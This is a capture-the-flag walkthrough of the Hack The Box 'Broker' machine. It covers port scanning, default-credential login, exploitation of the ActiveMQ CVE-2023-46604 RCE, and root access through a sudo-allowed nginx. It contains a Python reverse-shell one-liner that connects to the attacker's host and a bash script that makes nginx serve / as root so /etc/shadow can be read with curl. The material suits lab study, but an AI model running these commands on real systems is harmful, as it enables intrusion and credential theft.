# HTB - Broker

#### Ip: 10.10.11.177
#### Name: Broker
#### Rating: Easy

----------------------------------------------------------------------

![Broker.png](../assets/bank_assets/Broker.png)


### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I'll also use the `-sC` and `-sV` flags to use basic Nmap scripts and to enumerate versions too.

```
┌──(ryan㉿kali)-[~/HTB/Broker]
└─$ sudo nmap -p- --min-rate 10000 10.10.11.243 -sC -sV 
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-02 13:18 CST
Nmap scan report for 10.10.11.243
Host is up (0.081s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1337/tcp  open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 403 Forbidden
1338/tcp  open  http       nginx 1.18.0 (Ubuntu)
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE    TIME               FILENAME
| -       06-Nov-2023 01:10  bin/
| -       06-Nov-2023 01:10  bin/X11/
| 963     17-Feb-2020 14:11  bin/NF
| 129576  27-Oct-2023 11:38  bin/VGAuthService
| 51632   07-Feb-2022 16:03  bin/%5B
| 35344   19-Oct-2022 14:52  bin/aa-enabled
| 35344   19-Oct-2022 14:52  bin/aa-exec
| 31248   19-Oct-2022 14:52  bin/aa-features-abi
| 14478   04-May-2023 11:14  bin/add-apt-repository
| 14712   21-Feb-2022 01:49  bin/addpart
|_
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Index of /
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
37325/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
```

Looking at the site on port 80 we are met with a login popup, which we can use admin:admin to bypass.

Once logged in we see it is running ActiveMQ

![broker_80.png](../assets/bank_assets/broker_80.png)

### Exploitation

Searching for ActiveMQ exploits I find: https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell

Which sends a malicious poc.xml to the target and gets us a pseudo shell.

First lets update the poc.xml file to our atticking IP:

![broker_xml.png](../assets/bank_assets/broker_xml.png)

Then we can run the exploit:
```
┌──(ryan㉿kali)-[~/HTB/Broker]
└─$ python exploit.py -i 10.10.11.243 -p 61616 -si 10.10.14.60 -sp 8080              
#################################################################################
#  CVE-2023-46604 - Apache ActiveMQ - Remote Code Execution - Pseudo Shell      #
#  Exploit by Ducksec, Original POC by X1r0z, Python POC by evkl1d              #
#################################################################################

[*] Target: 10.10.11.243:61616
[*] Serving XML at: http://10.10.14.60:8080/poc.xml
[!] This is a semi-interactive pseudo-shell, you cannot cd, but you can ls-lah / for example.
[*] Type 'exit' to quit

#################################################################################
# Not yet connected, send a command to test connection to host.                 #
# Prompt will change to Apache ActiveMQ$ once at least one response is received #
# Please note this is a one-off connection check, re-run the script if you      #
# want to re-check the connection.                                              #
#################################################################################

[Target not responding!]$ ls
activemq
activemq-diag
activemq.jar
env
linux-x86-32
linux-x86-64
macosx
wrapper.jar

Apache ActiveMQ$ whoami
activemq

Apache ActiveMQ$ hostname
broker
```

This gets us a pseudoshell, but lets start up a netcat listener and issue a one liner to get a proper reverse shell back:

Lets run:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.60",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

And we catch a shell back:

```
┌──(ryan㉿kali)-[~/HTB/Broker]
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.243] 42396
$ whoami
whoami
activemq
$ hostname
hostname
broker
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```

We can now grab the user.txt flag:

![broker_user.png](../assets/bank_assets/broker_user.png)

### Privilege Escalation

For privilege escalation we can run `sudo -l` and see that we can run /usr/sbin/nginx with elevated permissions:

```
activemq@broker:/tmp$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Looking for ways to exploit this I found this writeup: https://darrenmartynie.wordpress.com/2021/10/25/zimbra-nginx-local-root-exploit/

Here we are provided with some exploit code to read normally protected files visible only to root:

```	
#!/bin/bash
echo "[+] making config"
cat <<EOF >/tmp/nginx.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
server {
    listen 1337;
    root /;
    autoindex on;
}
}
EOF
echo "[+] Launching..."
sudo /opt/zimbra/common/sbin/nginx -c /tmp/nginx.conf
echo "[+] Reading /etc/shadow..."
curl http://localhost:1337/etc/shadow
```

I'll update the line `sudo /opt/zimbra/common/sbin/nginx -c /tmp/nginx.conf` to `sudo /usr/sbin/nginx -c /tmp/nginx.conf`

And for the curl request I'll update it to getch the root.txt flag for me:
`curl http://localhost:1337/root/root.txt`

![broker_root.png](../assets/bank_assets/broker_root.png)

And that's that! 

There is a way to exploit this further to get a reverse shell from nginx as root outlined in the exploit article, but I chose to just grab the flag here. Alternatively, if you were feeling very lazy, you can access both flags from http://10.10.11.243:1338/ which is inexplicably hosting all files. 

![broker_files.png](../assets/bank_assets/broker_files.png)

But where would the fun be in that? I guess I landed somewhere in the middle.

Thanks for following along!

-Ryan
